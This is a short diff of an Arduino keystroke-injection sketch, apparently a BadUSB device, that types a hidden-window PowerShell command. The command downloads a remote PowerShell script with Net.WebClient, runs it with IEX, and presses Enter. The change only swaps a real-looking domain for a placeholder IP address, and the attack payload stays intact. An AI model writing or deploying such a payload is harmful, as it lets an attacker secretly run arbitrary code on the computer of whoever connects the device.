@@ -13,7 +13,7 @@ void setup() {
   Keyboard.releaseAll();
   delay(1000);
   
-  Keyboard.print("powershell -windowstyle hidden IEX (New-Object Net.WebClient).DownloadString('http://zysgmzb.club/hello/yuanshen.ps1');");
+  Keyboard.print("powershell -windowstyle hidden IEX (New-Object Net.WebClient).DownloadString('http://xx.xx.xx.xx/yuanshen.ps1');");
   Keyboard.press(KEY_RETURN);
   Keyboard.releaseAll();
   delay(2500);
